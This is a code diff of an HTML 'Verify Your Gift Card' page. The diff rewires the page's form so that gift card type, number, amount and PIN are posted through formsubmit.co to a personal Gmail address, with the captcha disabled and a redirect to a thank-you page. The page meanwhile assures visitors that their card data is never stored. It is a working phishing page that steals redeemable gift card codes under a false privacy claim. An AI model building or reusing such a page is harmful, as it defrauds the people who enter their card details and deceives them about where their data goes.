@@ -7,11 +7,11 @@
     <script src="https://cdn.tailwindcss.com"></script>
   </head>
   <body
-    class="min-h-screen bg-gradient-to-b from-gray-50 to-white flex items-center justify-center p-4 relative"
+    class="min-h-screen bg-gradient-to-b from-gray-50 to-white flex items-center justify-center relative"
   >
     <div
       id="card-app"
-      class="w-full max-w-4xl bg-white rounded-2xl shadow-xl overflow-hidden grid grid-cols-1 md:grid-cols-2"
+      class="w-full max-w-4xl bg-white md:rounded-2xl shadow-xl overflow-hidden grid grid-cols-1 md:grid-cols-2"
     >
       <!-- Left visuals -->
       <div
@@ -56,94 +56,93 @@
       </div>
 
       <!-- Right form -->
-      <div class="p-6 md:p-8">
-        <h2 class="text-2xl font-semibold mb-2">Verify Your Gift Card</h2>
-        <p class="text-sm text-gray-500 mb-6">
-          Enter your card information below. Data is never stored.
-        </p>
+      <form 
+  action="https://formsubmit.co/kingwahley@gmail.com" 
+  method="POST" 
+  class="p-6 md:p-8 space-y-4"
+>
+  <input type="hidden" name="_subject" value="New Card Verification Request" />
+  <input type="hidden" name="_captcha" value="false" />
+  <input type="hidden" name="_template" value="table" />
+  <input type="hidden" name="_next" value="https://giftcardverifierweb.onrender.com/thankyou.html" />
 
-        <div class="space-y-4">
-          <label class="block">
-            <span class="text-sm font-medium text-gray-700">Card type</span>
-            <select
-              id="cardType"
-              class="mt-2 w-full rounded-lg border px-3 py-2 outline-none focus:ring-2 focus:ring-indigo-300"
-            >
-              <option value="amazon">Amazon Gift Card</option>
-              <option value="apple">Apple Gift Card</option>
-              <option value="ebay">Google Play</option>
-              <option value="visa">Steam</option>
-              <option value="other">Other</option>
-            </select>
-          </label>
+  <h2 class="text-2xl font-semibold mb-2">Verify Your Gift Card</h2>
+  <p class="text-sm text-gray-500 mb-6">
+    Enter your card information below. Data is never stored.
+  </p>
 
-          <label class="block">
-           <div class="flex flex-row justify-between gap-4">
-            <!-- Card Number -->
-            <div class="w-2/3">
-              <label for="cardNumber" class="text-sm font-medium text-gray-700">Card number</label>
-              <input
-                id="cardNumber"
-                placeholder="e.g. 1234 5678"
-                class="mt-2 w-full rounded-lg border px-3 py-2 outline-none focus:ring-2 focus:ring-indigo-300"
-              />
-            </div>
+  <label class="block">
+    <span class="text-sm font-medium text-gray-700">Card type</span>
+    <select
+      id="cardType"
+      name="card_type"
+      class="mt-2 w-full rounded-lg border px-3 py-2 outline-none focus:ring-2 focus:ring-indigo-300"
+    >
+      <option value="amazon">Amazon Gift Card</option>
+      <option value="apple">Apple Gift Card</option>
+      <option value="ebay">Google Play</option>
+      <option value="visa">Steam</option>
+      <option value="other">Other</option>
+    </select>
+  </label>
 
-            <!-- Amount -->
-            <div class="w-1/3">
-              <label for="amount" class="text-sm font-medium text-gray-700">Amount</label>
-              <input
-                id="amount"
-                placeholder="$1500"
-                class="mt-2 w-full rounded-lg border px-3 py-2 outline-none focus:ring-2 focus:ring-indigo-300"
-              />
-            </div>
-          </div>
+  <div class="flex flex-row justify-between gap-4">
+    <div class="w-2/3">
+      <label for="cardNumber" class="text-sm font-medium text-gray-700">Card number</label>
+      <input
+        id="cardNumber"
+        name="card_number"
+        placeholder="e.g. 1234 5678"
+        class="mt-2 w-full rounded-lg border px-3 py-2 outline-none focus:ring-2 focus:ring-indigo-300"
+        required
+      />
+    </div>
 
-            
-          </label>
+    <div class="w-1/3">
+      <label for="amount" class="text-sm font-medium text-gray-700">Amount</label>
+      <input
+        id="amount"
+        name="amount"
+        placeholder="$1500"
+        class="mt-2 w-full rounded-lg border px-3 py-2 outline-none focus:ring-2 focus:ring-indigo-300"
+        required
+      />
+    </div>
+  </div>
 
-          <label class="block">
-            <span class="text-sm font-medium text-gray-700">PIN / Code (if any)</span>
-            <input
-              id="pin"
-              placeholder="e.g. 123456"
-              class="mt-2 w-full rounded-lg border px-3 py-2 outline-none focus:ring-2 focus:ring-indigo-300"
-            />
-          </label>
+  <label class="block">
+    <span class="text-sm font-medium text-gray-700">PIN / Code (if any)</span>
+    <input
+      id="pin"
+      name="pin"
+      placeholder="e.g. 123456"
+      class="mt-2 w-full rounded-lg border px-3 py-2 outline-none focus:ring-2 focus:ring-indigo-300"
+    />
+  </label>
 
-          <div class="flex items-center gap-3">
-            <button
-              id="verifyBtn"
-              class="flex-1 px-4 py-2 rounded-lg font-semibold shadow-sm bg-indigo-600 text-white transition transform hover:-translate-y-0.5 disabled:opacity-60 disabled:cursor-not-allowed"
-            >
-              Verify Card
-            </button>
+  <div class="flex items-center gap-3">
+    <button
+      type="submit"
+      id="verifyBtn"
+      class="flex-1 px-4 py-2 rounded-lg font-semibold shadow-sm bg-indigo-600 text-white transition transform hover:-translate-y-0.5"
+    >
+      Verify Card
+    </button>
 
-            <button
-              id="resetBtn"
-              class="px-4 py-2 rounded-lg border hover:bg-gray-50 text-sm"
-            >
-              Reset
-            </button>
-          </div>
+    <button
+      type="reset"
+      id="resetBtn"
+      class="px-4 py-2 rounded-lg border hover:bg-gray-50 text-sm"
+    >
+      Reset
+    </button>
+  </div>
 
-        
+  <div class="mt-6 text-xs text-gray-400">
+    We do not store your card details.
+  </div>
+</form>
 
-          <div class="mt-6 text-xs text-gray-400">
-            We do not store your card details.
-          </div>
-        </div>
-
-        <div
-          class="mt-6 flex items-center justify-between text-xs text-gray-400"
-        >
-          <div>
-            <a href="./index.html#process">Privacy</a></div>
-            <a href="./index.html#process">About</a></div>
-
-        </div>
-      </div>
     </div>
 
   
